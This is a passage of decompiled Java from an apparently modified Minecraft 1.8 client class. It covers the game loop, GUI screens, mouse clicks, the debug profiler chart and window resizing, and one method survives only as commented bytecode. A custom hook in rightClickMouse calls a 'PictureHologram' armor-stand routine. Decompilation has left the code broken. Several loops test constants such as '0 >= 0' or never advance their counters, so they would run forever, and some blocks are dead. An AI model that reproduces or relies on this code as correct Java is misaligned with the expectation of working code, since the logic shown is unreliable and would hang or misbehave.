        framebuffer.framebufferRender(ScaledResolution.getScaledWidth() * scaleFactor, ScaledResolution.getScaledHeight() * scaleFactor);
        GlStateManager.alphaFunc(516, 0.1f);
        this.func_175601_h();
    }
    
    public void scaledTessellator(final int n, final int n2, final int n3, final int n4, final int n5, final int n6) {
        final float n7 = 0.00390625f;
        final float n8 = 0.00390625f;
        final WorldRenderer worldRenderer = Tessellator.getInstance().getWorldRenderer();
        worldRenderer.startDrawingQuads();
        worldRenderer.addVertexWithUV(n + 0, n2 + n6, 0.0, (n3 + 0) * n7, (n4 + n6) * n8);
        worldRenderer.addVertexWithUV(n + n5, n2 + n6, 0.0, (n3 + n5) * n7, (n4 + n6) * n8);
        worldRenderer.addVertexWithUV(n + n5, n2 + 0, 0.0, (n3 + n5) * n7, (n4 + 0) * n8);
        worldRenderer.addVertexWithUV(n + 0, n2 + 0, 0.0, (n3 + 0) * n7, (n4 + 0) * n8);
        Tessellator.getInstance().draw();
    }
    
    public ISaveFormat getSaveLoader() {
        return this.saveLoader;
    }
    
    public void displayGuiScreen(GuiScreen currentScreen) {
        if (this.currentScreen != null) {
            this.currentScreen.onGuiClosed();
        }
        if (currentScreen == null && Minecraft.theWorld == null) {
            currentScreen = new GuiMainMenu();
        }
        else if (currentScreen == null && Minecraft.thePlayer.getHealth() <= 0.0f) {
            currentScreen = new GuiGameOver();
        }
        if (currentScreen instanceof GuiMainMenu) {
            this.gameSettings.showDebugInfo = false;
            Minecraft.ingameGUI.getChatGUI().clearChatMessages();
        }
        if ((this.currentScreen = currentScreen) != null) {
            this.setIngameNotInFocus();
            final ScaledResolution scaledResolution = new ScaledResolution(this, this.displayWidth, this.displayHeight);
            currentScreen.setWorldAndResolution(this, ScaledResolution.getScaledWidth(), ScaledResolution.getScaledHeight());
            this.skipRenderWorld = false;
        }
        else {
            Minecraft.mcSoundHandler.resumeSounds();
            this.setIngameFocus();
        }
    }
    
    private void checkGLError(final String s) {
        if (this.field_175619_R) {
            final int glGetError = GL11.glGetError();
            if (glGetError != 0) {
                final String gluErrorString = GLU.gluErrorString(glGetError);
                Minecraft.logger.error("########## GL ERROR ##########");
                Minecraft.logger.error("@ " + s);
                Minecraft.logger.error(String.valueOf(glGetError) + ": " + gluErrorString);
            }
        }
    }
    
    public void shutdownMinecraftApplet() {
        this.stream.shutdownStream();
        Minecraft.logger.info("Stopping!");
        this.loadWorld(null);
        Minecraft.mcSoundHandler.unloadSounds();
        if (!this.hasCrashed) {
            System.exit(0);
        }
        System.gc();
    }
    
    private void runGameLoop() throws IOException {
        this.mcProfiler.startSection("root");
        if (Display.isCreated() && Display.isCloseRequested()) {
            this.shutdown();
        }
        if (this.isGamePaused && Minecraft.theWorld != null) {
            final float renderPartialTicks = this.timer.renderPartialTicks;
            this.timer.updateTimer();
            this.timer.renderPartialTicks = renderPartialTicks;
        }
        else {
            this.timer.updateTimer();
        }
        this.mcProfiler.startSection("scheduledExecutables");
        final Queue scheduledTasks = this.scheduledTasks;
        // monitorenter(scheduledTasks2 = this.scheduledTasks)
        while (!this.scheduledTasks.isEmpty()) {
            this.scheduledTasks.poll().run();
        }
        // monitorexit(scheduledTasks2)
        this.mcProfiler.endSection();
        final long nanoTime = System.nanoTime();
        this.mcProfiler.startSection("tick");
        while (0 < this.timer.elapsedTicks) {
            this.runTick();
            int n = 0;
            ++n;
        }
        this.mcProfiler.endStartSection("preRenderErrors");
        final long n2 = System.nanoTime() - nanoTime;
        this.checkGLError("Pre render");
        this.mcProfiler.endStartSection("sound");
        Minecraft.mcSoundHandler.setListener(Minecraft.thePlayer, this.timer.renderPartialTicks);
        this.mcProfiler.endSection();
        this.mcProfiler.startSection("render");
        GlStateManager.clear(16640);
        this.framebufferMc.bindFramebuffer(true);
        this.mcProfiler.startSection("display");
        if (Minecraft.thePlayer != null && Minecraft.thePlayer.isEntityInsideOpaqueBlock()) {
            this.gameSettings.thirdPersonView = 0;
        }
        this.mcProfiler.endSection();
        if (!this.skipRenderWorld) {
            this.mcProfiler.endStartSection("gameRenderer");
            this.entityRenderer.updateCameraAndRender(this.timer.renderPartialTicks);
            this.mcProfiler.endSection();
        }
        this.mcProfiler.endSection();
        if (this.gameSettings.showDebugInfo && this.gameSettings.showDebugProfilerChart && !this.gameSettings.hideGUI) {
            if (!this.mcProfiler.profilingEnabled) {
                this.mcProfiler.clearProfiling();
            }
            this.mcProfiler.profilingEnabled = true;
            this.displayDebugInfo(n2);
        }
        else {
            this.mcProfiler.profilingEnabled = false;
            this.prevFrameTime = System.nanoTime();
        }
        this.guiAchievement.updateAchievementWindow();
        this.framebufferMc.unbindFramebuffer();
        this.framebufferMc.framebufferRender(this.displayWidth, this.displayHeight);
        this.entityRenderer.func_152430_c(this.timer.renderPartialTicks);
        this.mcProfiler.startSection("root");
        this.func_175601_h();
        Thread.yield();
        this.mcProfiler.startSection("stream");
        this.mcProfiler.startSection("update");
        this.stream.func_152935_j();
        this.mcProfiler.endStartSection("submit");
        this.stream.func_152922_k();
        this.mcProfiler.endSection();
        this.mcProfiler.endSection();
        this.checkGLError("Post render");
        ++this.fpsCounter;
        this.isGamePaused = (this.isSingleplayer() && this.currentScreen != null && this.currentScreen.doesGuiPauseGame() && !this.theIntegratedServer.getPublic());
        while (getSystemTime() >= this.debugUpdateTime + 1000L) {
            Minecraft.debugFPS = this.fpsCounter;
            this.debug = String.format("%d fps (%d chunk update%s) T: %s%s%s%s%s", Minecraft.debugFPS, RenderChunk.field_178592_a, (RenderChunk.field_178592_a != 1) ? "s" : "", (this.gameSettings.limitFramerate == GameSettings.Options.FRAMERATE_LIMIT.getValueMax()) ? "inf" : Integer.valueOf(this.gameSettings.limitFramerate), this.gameSettings.enableVsync ? " vsync" : "", this.gameSettings.fancyGraphics ? "" : " fast", this.gameSettings.clouds ? " clouds" : "", OpenGlHelper.func_176075_f() ? " vbo" : "");
            RenderChunk.field_178592_a = 0;
            this.debugUpdateTime += 1000L;
            this.fpsCounter = 0;
            this.usageSnooper.addMemoryStatsToSnooper();
            if (!this.usageSnooper.isSnooperRunning()) {
                this.usageSnooper.startSnooper();
            }
        }
        if (this.isFramerateLimitBelowMax()) {
            this.mcProfiler.startSection("fpslimit_wait");
            Display.sync(this.getLimitFramerate());
            this.mcProfiler.endSection();
        }
        this.mcProfiler.endSection();
    }
    
    public void func_175601_h() {
        this.mcProfiler.startSection("display_update");
        this.mcProfiler.endSection();
        this.func_175604_i();
    }
    
    protected void func_175604_i() {
        if (!this.fullscreen && Display.wasResized()) {
            final int displayWidth = this.displayWidth;
            final int displayHeight = this.displayHeight;
            this.displayWidth = Display.getWidth();
            this.displayHeight = Display.getHeight();
            if (this.displayWidth != displayWidth || this.displayHeight != displayHeight) {
                if (this.displayWidth <= 0) {
                    this.displayWidth = 1;
                }
                if (this.displayHeight <= 0) {
                    this.displayHeight = 1;
                }
                this.resize(this.displayWidth, this.displayHeight);
            }
        }
    }
    
    public int getLimitFramerate() {
        return (Minecraft.theWorld == null && this.currentScreen != null) ? 30 : this.gameSettings.limitFramerate;
    }
    
    public boolean isFramerateLimitBelowMax() {
        return this.getLimitFramerate() < GameSettings.Options.FRAMERATE_LIMIT.getValueMax();
    }
    
    public void freeMemory() {
        Minecraft.memoryReserve = new byte[0];
        this.renderGlobal.deleteAllDisplayLists();
        System.gc();
        this.loadWorld(null);
        System.gc();
    }
    
    private void updateDebugProfilerName(int n) {
        final List profilingData = this.mcProfiler.getProfilingData(this.debugProfilerName);
        if (profilingData != null && !profilingData.isEmpty()) {
            final Profiler.Result result = profilingData.remove(0);
            if (n == 0) {
                if (result.field_76331_c.length() > 0) {
                    final int lastIndex = this.debugProfilerName.lastIndexOf(".");
                    if (lastIndex >= 0) {
                        this.debugProfilerName = this.debugProfilerName.substring(0, lastIndex);
                    }
                }
            }
            else if (--n < profilingData.size() && !profilingData.get(n).field_76331_c.equals("unspecified")) {
                if (this.debugProfilerName.length() > 0) {
                    this.debugProfilerName = String.valueOf(this.debugProfilerName) + ".";
                }
                this.debugProfilerName = String.valueOf(this.debugProfilerName) + profilingData.get(n).field_76331_c;
            }
        }
    }
    
    private void displayDebugInfo(final long n) {
        if (this.mcProfiler.profilingEnabled) {
            final List profilingData = this.mcProfiler.getProfilingData(this.debugProfilerName);
            final Profiler.Result result = profilingData.remove(0);
            GlStateManager.clear(256);
            GlStateManager.matrixMode(5889);
            GlStateManager.ortho(0.0, this.displayWidth, this.displayHeight, 0.0, 1000.0, 3000.0);
            GlStateManager.matrixMode(5888);
            GlStateManager.translate(0.0f, 0.0f, -2000.0f);
            GL11.glLineWidth(1.0f);
            final Tessellator instance = Tessellator.getInstance();
            final WorldRenderer worldRenderer = instance.getWorldRenderer();
            final int n2 = this.displayWidth - 160 - 10;
            final int n3 = this.displayHeight - 320;
            worldRenderer.startDrawingQuads();
            worldRenderer.func_178974_a(0, 200);
            worldRenderer.addVertex(n2 - 160 * 1.1f, n3 - 160 * 0.6f - 16.0f, 0.0);
            worldRenderer.addVertex(n2 - 160 * 1.1f, n3 + 320, 0.0);
            worldRenderer.addVertex(n2 + 160 * 1.1f, n3 + 320, 0.0);
            worldRenderer.addVertex(n2 + 160 * 1.1f, n3 - 160 * 0.6f - 16.0f, 0.0);
            instance.draw();
            double n4 = 0.0;
            int n7 = 0;
            while (0 < profilingData.size()) {
                final Profiler.Result result2 = profilingData.get(0);
                final int n5 = MathHelper.floor_double(result2.field_76332_a / 4.0) + 1;
                worldRenderer.startDrawing(6);
                worldRenderer.func_178991_c(result2.func_76329_a());
                worldRenderer.addVertex(n2, n3, 0.0);
                while (0 >= 0) {
                    final float n6 = (float)((n4 + result2.field_76332_a * 0 / 16777215) * 3.141592653589793 * 2.0 / 100.0);
                    worldRenderer.addVertex(n2 + MathHelper.sin(n6) * 160, n3 - MathHelper.cos(n6) * 160 * 0.5f, 0.0);
                    --n7;
                }
                instance.draw();
                worldRenderer.startDrawing(5);
                worldRenderer.func_178991_c((result2.func_76329_a() & 0xFEFEFE) >> 1);
                while (0 >= 0) {
                    final float n8 = (float)((n4 + result2.field_76332_a * 0 / 16777215) * 3.141592653589793 * 2.0 / 100.0);
                    final float n9 = MathHelper.sin(n8) * 160;
                    final float n10 = MathHelper.cos(n8) * 160 * 0.5f;
                    worldRenderer.addVertex(n2 + n9, n3 - n10, 0.0);
                    worldRenderer.addVertex(n2 + n9, n3 - n10 + 10.0f, 0.0);
                    --n7;
                }
                instance.draw();
                n4 += result2.field_76332_a;
                int n11 = 0;
                ++n11;
            }
            final DecimalFormat decimalFormat = new DecimalFormat("##0.00");
            String string = "";
            if (!result.field_76331_c.equals("unspecified")) {
                string = String.valueOf(string) + "[0] ";
            }
            String s;
            if (result.field_76331_c.length() == 0) {
                s = String.valueOf(string) + "ROOT ";
            }
            else {
                s = String.valueOf(string) + result.field_76331_c + " ";
            }
            Minecraft.fontRendererObj.func_175063_a(s, (float)(n2 - 160), (float)(n3 - 1 - 16), 16777215);
            final FontRenderer fontRendererObj = Minecraft.fontRendererObj;
            final String string2 = String.valueOf(decimalFormat.format(result.field_76330_b)) + "%";
            fontRendererObj.func_175063_a(string2, (float)(n2 + 160 - Minecraft.fontRendererObj.getStringWidth(string2)), (float)(n3 - 1 - 16), 16777215);
            while (0 < profilingData.size()) {
                final Profiler.Result result3 = profilingData.get(0);
                final String s2 = "";
                String s3;
                if (result3.field_76331_c.equals("unspecified")) {
                    s3 = String.valueOf(s2) + "[?] ";
                }
                else {
                    s3 = String.valueOf(s2) + "[" + 1 + "] ";
                }
                Minecraft.fontRendererObj.func_175063_a(String.valueOf(s3) + result3.field_76331_c, (float)(n2 - 160), (float)(n3 + 1 + 0 + 20), result3.func_76329_a());
                final FontRenderer fontRendererObj2 = Minecraft.fontRendererObj;
                final String string3 = String.valueOf(decimalFormat.format(result3.field_76332_a)) + "%";
                fontRendererObj2.func_175063_a(string3, (float)(n2 + 160 - 50 - Minecraft.fontRendererObj.getStringWidth(string3)), (float)(n3 + 1 + 0 + 20), result3.func_76329_a());
                final FontRenderer fontRendererObj3 = Minecraft.fontRendererObj;
                final String string4 = String.valueOf(decimalFormat.format(result3.field_76330_b)) + "%";
                fontRendererObj3.func_175063_a(string4, (float)(n2 + 160 - Minecraft.fontRendererObj.getStringWidth(string4)), (float)(n3 + 1 + 0 + 20), result3.func_76329_a());
                ++n7;
            }
        }
    }
    
    public void shutdown() {
        this.running = false;
    }
    
    public void setIngameFocus() {
        if (Display.isActive() && !this.inGameHasFocus) {
            this.inGameHasFocus = true;
            this.mouseHelper.grabMouseCursor();
            this.displayGuiScreen(null);
            this.leftClickCounter = 10000;
        }
    }
    
    public void setIngameNotInFocus() {
        if (this.inGameHasFocus) {
            this.inGameHasFocus = false;
            this.mouseHelper.ungrabMouseCursor();
        }
    }
    
    public void displayInGameMenu() {
        if (this.currentScreen == null) {
            this.displayGuiScreen(new GuiIngameMenu());
            if (this.isSingleplayer() && !this.theIntegratedServer.getPublic()) {
                Minecraft.mcSoundHandler.pauseSounds();
            }
        }
    }
    
    private void sendClickBlockToController(final boolean b) {
        if (!b) {
            this.leftClickCounter = 0;
        }
        if (this.leftClickCounter <= 0 && !Minecraft.thePlayer.isUsingItem()) {
            if (b && this.objectMouseOver != null && this.objectMouseOver.typeOfHit == MovingObjectPosition.MovingObjectType.BLOCK) {
                final BlockPos func_178782_a = this.objectMouseOver.func_178782_a();
                if (Minecraft.theWorld.getBlockState(func_178782_a).getBlock().getMaterial() != Material.air && Minecraft.playerController.func_180512_c(func_178782_a, this.objectMouseOver.field_178784_b)) {
                    this.effectRenderer.func_180532_a(func_178782_a, this.objectMouseOver.field_178784_b);
                    Minecraft.thePlayer.swingItem();
                }
            }
            else {
                Minecraft.playerController.resetBlockRemoving();
            }
        }
    }
    
    public void clickMouse() {
        if (this.leftClickCounter <= 0) {
            Minecraft.thePlayer.swingItem();
            if (this.objectMouseOver == null) {
                Minecraft.logger.error("Null returned as 'hitResult', this shouldn't happen!");
                if (Minecraft.playerController.isNotCreative()) {
                    this.leftClickCounter = 10;
                }
            }
            else {
                switch (SwitchEnumMinecartType.field_152390_a[this.objectMouseOver.typeOfHit.ordinal()]) {
                    case 1: {
                        Minecraft.playerController.attackEntity(Minecraft.thePlayer, this.objectMouseOver.entityHit);
                        return;
                    }
                    case 2: {
                        final BlockPos func_178782_a = this.objectMouseOver.func_178782_a();
                        if (Minecraft.theWorld.getBlockState(func_178782_a).getBlock().getMaterial() != Material.air) {
                            Minecraft.playerController.func_180511_b(func_178782_a, this.objectMouseOver.field_178784_b);
                            return;
                        }
                        break;
                    }
                }
                if (Minecraft.playerController.isNotCreative()) {
                    this.leftClickCounter = 10;
                }
            }
        }
    }
    
    public void rightClickMouse() {
        Minecraft.rightClickDelayTimer = 4;
        final ItemStack currentItem = Minecraft.thePlayer.inventory.getCurrentItem();
        if (currentItem != null && currentItem.getDisplayName().contains("#")) {
            PictureHologram.client.giveNextArmorstand();
        }
        if (this.objectMouseOver == null) {
            Minecraft.logger.warn("Null returned as 'hitResult', this shouldn't happen!");
        }
        else {
            switch (SwitchEnumMinecartType.field_152390_a[this.objectMouseOver.typeOfHit.ordinal()]) {
                case 1: {
                    if (Minecraft.playerController.func_178894_a(Minecraft.thePlayer, this.objectMouseOver.entityHit, this.objectMouseOver)) {
                        break;
                    }
                    if (Minecraft.playerController.interactWithEntitySendPacket(Minecraft.thePlayer, this.objectMouseOver.entityHit)) {
                        break;
                    }
                    break;
                }
                case 2: {
                    final BlockPos func_178782_a = this.objectMouseOver.func_178782_a();
                    if (Minecraft.theWorld.getBlockState(func_178782_a).getBlock().getMaterial() == Material.air) {
                        break;
                    }
                    final int n = (currentItem != null) ? currentItem.stackSize : 0;
                    if (Minecraft.playerController.func_178890_a(Minecraft.thePlayer, Minecraft.theWorld, currentItem, func_178782_a, this.objectMouseOver.field_178784_b, this.objectMouseOver.hitVec)) {
                        Minecraft.thePlayer.swingItem();
                    }
                    if (currentItem == null) {
                        return;
                    }
                    if (currentItem.stackSize == 0) {
                        Minecraft.thePlayer.inventory.mainInventory[Minecraft.thePlayer.inventory.currentItem] = null;
                        break;
                    }
                    if (currentItem.stackSize != n || Minecraft.playerController.isInCreativeMode()) {
                        this.entityRenderer.itemRenderer.resetEquippedProgress();
                        break;
                    }
                    break;
                }
            }
        }
        if (false) {
            final ItemStack currentItem2 = Minecraft.thePlayer.inventory.getCurrentItem();
            if (currentItem2 != null && Minecraft.playerController.sendUseItem(Minecraft.thePlayer, Minecraft.theWorld, currentItem2)) {
                this.entityRenderer.itemRenderer.resetEquippedProgress2();
            }
        }
    }
    
    public void toggleFullscreen() {
        this.fullscreen = !this.fullscreen;
        this.gameSettings.fullScreen = this.fullscreen;
        if (this.fullscreen) {
            this.updateDisplayMode();
            this.displayWidth = Display.getDisplayMode().getWidth();
            this.displayHeight = Display.getDisplayMode().getHeight();
            if (this.displayWidth <= 0) {
                this.displayWidth = 1;
            }
            if (this.displayHeight <= 0) {
                this.displayHeight = 1;
            }
        }
        else {
            Display.setDisplayMode(new DisplayMode(this.tempDisplayWidth, this.tempDisplayHeight));
            this.displayWidth = this.tempDisplayWidth;
            this.displayHeight = this.tempDisplayHeight;
            if (this.displayWidth <= 0) {
                this.displayWidth = 1;
            }
            if (this.displayHeight <= 0) {
                this.displayHeight = 1;
            }
        }
        if (this.currentScreen != null) {
            this.resize(this.displayWidth, this.displayHeight);
        }
        else {
            this.updateFramebufferSize();
        }
        Display.setFullscreen(this.fullscreen);
        Display.setVSyncEnabled(this.gameSettings.enableVsync);
        this.func_175601_h();
    }
    
    private void resize(final int n, final int n2) {
        this.displayWidth = Math.max(1, n);
        this.displayHeight = Math.max(1, n2);
        if (this.currentScreen != null) {
            final ScaledResolution scaledResolution = new ScaledResolution(this, n, n2);
            this.currentScreen.func_175273_b(this, ScaledResolution.getScaledWidth(), ScaledResolution.getScaledHeight());
        }
        this.loadingScreen = new LoadingScreenRenderer(this);
        this.updateFramebufferSize();
    }
    
    private void updateFramebufferSize() {
        this.framebufferMc.createBindFramebuffer(this.displayWidth, this.displayHeight);
        if (this.entityRenderer != null) {
            this.entityRenderer.updateShaderGroupSize(this.displayWidth, this.displayHeight);
        }
    }
    
    public void runTick() throws IOException {
        // 
        // This method could not be decompiled.
        // 
        // Original Bytecode:
        // 
        //     3: ifle            14
        //     6: getstatic       net/minecraft/client/Minecraft.rightClickDelayTimer:I
        //     9: iconst_1       
        //    10: isub           
        //    11: putstatic       net/minecraft/client/Minecraft.rightClickDelayTimer:I
        //    14: aload_0        
        //    15: getfield        net/minecraft/client/Minecraft.mcProfiler:Lnet/minecraft/profiler/Profiler;
        //    18: ldc_w           "gui"
        //    21: invokevirtual   net/minecraft/profiler/Profiler.startSection:(Ljava/lang/String;)V
        //    24: aload_0        
        //    25: getfield        net/minecraft/client/Minecraft.isGamePaused:Z
        //    28: ifne            37
        //    31: getstatic       net/minecraft/client/Minecraft.ingameGUI:Lnet/minecraft/client/gui/GuiIngame;
        //    34: invokevirtual   net/minecraft/client/gui/GuiIngame.updateTick:()V
        //    37: aload_0        
        //    38: getfield        net/minecraft/client/Minecraft.mcProfiler:Lnet/minecraft/profiler/Profiler;
        //    41: invokevirtual   net/minecraft/profiler/Profiler.endSection:()V
        //    44: aload_0        
        //    45: getfield        net/minecraft/client/Minecraft.entityRenderer:Lnet/minecraft/client/renderer/EntityRenderer;
        //    48: fconst_1       
        //    49: invokevirtual   net/minecraft/client/renderer/EntityRenderer.getMouseOver:(F)V
        //    52: aload_0        
        //    53: getfield        net/minecraft/client/Minecraft.mcProfiler:Lnet/minecraft/profiler/Profiler;
        //    56: ldc_w           "gameMode"
        //    59: invokevirtual   net/minecraft/profiler/Profiler.startSection:(Ljava/lang/String;)V
        //    62: aload_0        
        //    63: getfield        net/minecraft/client/Minecraft.isGamePaused:Z
        //    66: ifne            81
        //    69: getstatic       net/minecraft/client/Minecraft.theWorld:Lnet/minecraft/client/multiplayer/WorldClient;
        //    72: ifnull          81
        //    75: getstatic       net/minecraft/client/Minecraft.playerController:Lnet/minecraft/client/multiplayer/PlayerControllerMP;
        //    78: invokevirtual   net/minecraft/client/multiplayer/PlayerControllerMP.updateController:()V
        //    81: aload_0        
        //    82: getfield        net/minecraft/client/Minecraft.mcProfiler:Lnet/minecraft/profiler/Profiler;
        //    85: ldc_w           "textures"
        //    88: invokevirtual   net/minecraft/profiler/Profiler.endStartSection:(Ljava/lang/String;)V
        //    91: aload_0        
        //    92: getfield        net/minecraft/client/Minecraft.isGamePaused:Z
        //    95: ifne            105
        //    98: aload_0        
        //    99: getfield        net/minecraft/client/Minecraft.renderEngine:Lnet/minecraft/client/renderer/texture/TextureManager;
        //   102: invokevirtual   net/minecraft/client/renderer/texture/TextureManager.tick:()V
        //   105: aload_0        
        //   106: getfield        net/minecraft/client/Minecraft.currentScreen:Lnet/minecraft/client/gui/GuiScreen;
        //   109: ifnonnull       166
        //   112: getstatic       net/minecraft/client/Minecraft.thePlayer:Lnet/minecraft/client/entity/EntityPlayerSP;
        //   115: ifnull          166
        //   118: getstatic       net/minecraft/client/Minecraft.thePlayer:Lnet/minecraft/client/entity/EntityPlayerSP;
        //   121: invokevirtual   net/minecraft/client/entity/EntityPlayerSP.getHealth:()F
        //   124: fconst_0       
        //   125: fcmpg          
        //   126: ifgt            137
        //   129: aload_0        
        //   130: aconst_null    
        //   131: invokevirtual   net/minecraft/client/Minecraft.displayGuiScreen:(Lnet/minecraft/client/gui/GuiScreen;)V
        //   134: goto            197
        //   137: getstatic       net/minecraft/client/Minecraft.thePlayer:Lnet/minecraft/client/entity/EntityPlayerSP;
        //   140: invokevirtual   net/minecraft/client/entity/EntityPlayerSP.isPlayerSleeping:()Z
        //   143: ifeq            197
        //   146: getstatic       net/minecraft/client/Minecraft.theWorld:Lnet/minecraft/client/multiplayer/WorldClient;
        //   149: ifnull          197
        //   152: aload_0        
        //   153: new             Lnet/minecraft/client/gui/GuiSleepMP;
        //   156: dup            
        //   157: invokespecial   net/minecraft/client/gui/GuiSleepMP.<init>:()V
        //   160: invokevirtual   net/minecraft/client/Minecraft.displayGuiScreen:(Lnet/minecraft/client/gui/GuiScreen;)V
        //   163: goto            197
        //   166: aload_0        
        //   167: getfield        net/minecraft/client/Minecraft.currentScreen:Lnet/minecraft/client/gui/GuiScreen;
        //   170: ifnull          197
        //   173: aload_0        
        //   174: getfield        net/minecraft/client/Minecraft.currentScreen:Lnet/minecraft/client/gui/GuiScreen;
        //   177: instanceof      Lnet/minecraft/client/gui/GuiSleepMP;
        //   180: ifeq            197
        //   183: getstatic       net/minecraft/client/Minecraft.thePlayer:Lnet/minecraft/client/entity/EntityPlayerSP;
        //   186: invokevirtual   net/minecraft/client/entity/EntityPlayerSP.isPlayerSleeping:()Z
        //   189: ifne            197
        //   192: aload_0        
        //   193: aconst_null    
        //   194: invokevirtual   net/minecraft/client/Minecraft.displayGuiScreen:(Lnet/minecraft/client/gui/GuiScreen;)V
        //   197: aload_0        
        //   198: getfield        net/minecraft/client/Minecraft.currentScreen:Lnet/minecraft/client/gui/GuiScreen;
        //   201: ifnull          211
        //   204: aload_0        
        //   205: sipush          10000
        //   208: putfield        net/minecraft/client/Minecraft.leftClickCounter:I
        //   211: aload_0        
        //   212: getfield        net/minecraft/client/Minecraft.currentScreen:Lnet/minecraft/client/gui/GuiScreen;
        //   215: ifnull          327
        //   218: aload_0        
        //   219: getfield        net/minecraft/client/Minecraft.currentScreen:Lnet/minecraft/client/gui/GuiScreen;
        //   222: invokevirtual   net/minecraft/client/gui/GuiScreen.handleInput:()V
        //   225: goto            269
        //   228: astore_3       
        //   229: aload_3        
        //   230: ldc_w           "Updating screen events"
        //   233: invokestatic    net/minecraft/crash/CrashReport.makeCrashReport:(Ljava/lang/Throwable;Ljava/lang/String;)Lnet/minecraft/crash/CrashReport;
        //   236: astore_1       
        //   237: aload_1        
        //   238: ldc_w           "Affected screen"
        //   241: invokevirtual   net/minecraft/crash/CrashReport.makeCategory:(Ljava/lang/String;)Lnet/minecraft/crash/CrashReportCategory;
        //   244: astore_2       
        //   245: aload_2        
        //   246: ldc_w           "Screen name"
        //   249: new             Lnet/minecraft/client/Minecraft$3;
        //   252: dup            
        //   253: aload_0        
        //   254: invokespecial   net/minecraft/client/Minecraft$3.<init>:(Lnet/minecraft/client/Minecraft;)V
        //   257: invokevirtual   net/minecraft/crash/CrashReportCategory.addCrashSectionCallable:(Ljava/lang/String;Ljava/util/concurrent/Callable;)V
        //   260: new             Lnet/minecraft/util/ReportedException;
        //   263: dup            
        //   264: aload_1        
        //   265: invokespecial   net/minecraft/util/ReportedException.<init>:(Lnet/minecraft/crash/CrashReport;)V
        //   268: athrow         
        //   269: aload_0        
        //   270: getfield        net/minecraft/client/Minecraft.currentScreen:Lnet/minecraft/client/gui/GuiScreen;
        //   273: ifnull          327
        //   276: aload_0        
        //   277: getfield        net/minecraft/client/Minecraft.currentScreen:Lnet/minecraft/client/gui/GuiScreen;
        //   280: invokevirtual   net/minecraft/client/gui/GuiScreen.updateScreen:()V
        //   283: goto            327
        //   286: astore_3       
        //   287: aload_3        
        //   288: ldc_w           "Ticking screen"
        //   291: invokestatic    net/minecraft/crash/CrashReport.makeCrashReport:(Ljava/lang/Throwable;Ljava/lang/String;)Lnet/minecraft/crash/CrashReport;
        //   294: astore_1       
        //   295: aload_1        
        //   296: ldc_w           "Affected screen"
        //   299: invokevirtual   net/minecraft/crash/CrashReport.makeCategory:(Ljava/lang/String;)Lnet/minecraft/crash/CrashReportCategory;
        //   302: astore_2       
        //   303: aload_2        
        //   304: ldc_w           "Screen name"
        //   307: new             Lnet/minecraft/client/Minecraft$4;
        //   310: dup            
        //   311: aload_0        
        //   312: invokespecial   net/minecraft/client/Minecraft$4.<init>:(Lnet/minecraft/client/Minecraft;)V
        //   315: invokevirtual   net/minecraft/crash/CrashReportCategory.addCrashSectionCallable:(Ljava/lang/String;Ljava/util/concurrent/Callable;)V
        //   318: new             Lnet/minecraft/util/ReportedException;
        //   321: dup            
        //   322: aload_1        
        //   323: invokespecial   net/minecraft/util/ReportedException.<init>:(Lnet/minecraft/crash/CrashReport;)V
        //   326: athrow         
        //   327: aload_0        
        //   328: getfield        net/minecraft/client/Minecraft.currentScreen:Lnet/minecraft/client/gui/GuiScreen;
        //   331: ifnull          344
        //   334: aload_0        
        //   335: getfield        net/minecraft/client/Minecraft.currentScreen:Lnet/minecraft/client/gui/GuiScreen;
        //   338: getfield        net/minecraft/client/gui/GuiScreen.allowUserInput:Z
        //   341: ifeq            1843
        //   344: aload_0        
        //   345: getfield        net/minecraft/client/Minecraft.mcProfiler:Lnet/minecraft/profiler/Profiler;
        //   348: ldc_w           "mouse"
        //   351: invokevirtual   net/minecraft/profiler/Profiler.endStartSection:(Ljava/lang/String;)V
        //   354: goto            575
        //   357: invokestatic    org/lwjgl/input/Mouse.getEventButton:()I
        //   360: istore_3       
        //   361: bipush          -100
        //   363: invokestatic    org/lwjgl/input/Mouse.getEventButtonState:()Z
        //   366: invokestatic    net/minecraft/client/settings/KeyBinding.setKeyBindState:(IZ)V
        //   369: invokestatic    org/lwjgl/input/Mouse.getEventButtonState:()Z
        //   372: ifeq            406
        //   375: getstatic       net/minecraft/client/Minecraft.thePlayer:Lnet/minecraft/client/entity/EntityPlayerSP;
        //   378: invokevirtual   net/minecraft/client/entity/EntityPlayerSP.func_175149_v:()Z
        //   381: ifeq            401
        //   384: iconst_0       
        //   385: iconst_2       
        //   386: if_icmpne       401
        //   389: getstatic       net/minecraft/client/Minecraft.ingameGUI:Lnet/minecraft/client/gui/GuiIngame;
        //   392: invokevirtual   net/minecraft/client/gui/GuiIngame.func_175187_g:()Lnet/minecraft/client/gui/GuiSpectator;
        //   395: invokevirtual   net/minecraft/client/gui/GuiSpectator.func_175261_b:()V
        //   398: goto            406
        //   401: bipush          -100
        //   403: invokestatic    net/minecraft/client/settings/KeyBinding.onTick:(I)V
        //   406: invokestatic    net/minecraft/client/Minecraft.getSystemTime:()J
        //   409: aload_0        
        //   410: getfield        net/minecraft/client/Minecraft.systemTime:J
        //   413: lsub           
        //   414: lstore          4
        //   416: lload           4
        //   418: ldc2_w          200
        //   421: lcmp           
        //   422: ifgt            575
        //   425: invokestatic    org/lwjgl/input/Mouse.getEventDWheel:()I
        //   428: istore          6
        //   430: iload           6
        //   432: ifeq            534
        //   435: getstatic       net/minecraft/client/Minecraft.thePlayer:Lnet/minecraft/client/entity/EntityPlayerSP;
        //   438: invokevirtual   net/minecraft/client/entity/EntityPlayerSP.func_175149_v:()Z
        //   441: ifeq            523
        //   444: iload           6
        //   446: ifge            453
        //   449: iconst_m1      
        //   450: goto            454
        //   453: iconst_1       
        //   454: istore          6
        //   456: getstatic       net/minecraft/client/Minecraft.ingameGUI:Lnet/minecraft/client/gui/GuiIngame;
        //   459: invokevirtual   net/minecraft/client/gui/GuiIngame.func_175187_g:()Lnet/minecraft/client/gui/GuiSpectator;
        //   462: invokevirtual   net/minecraft/client/gui/GuiSpectator.func_175262_a:()Z
        //   465: ifeq            483
        //   468: getstatic       net/minecraft/client/Minecraft.ingameGUI:Lnet/minecraft/client/gui/GuiIngame;
        //   471: invokevirtual   net/minecraft/client/gui/GuiIngame.func_175187_g:()Lnet/minecraft/client/gui/GuiSpectator;
        //   474: iload           6
        //   476: ineg           
        //   477: invokevirtual   net/minecraft/client/gui/GuiSpectator.func_175259_b:(I)V
        //   480: goto            534
        //   483: getstatic       net/minecraft/client/Minecraft.thePlayer:Lnet/minecraft/client/entity/EntityPlayerSP;
        //   486: getfield        net/minecraft/client/entity/EntityPlayerSP.capabilities:Lnet/minecraft/entity/player/PlayerCapabilities;
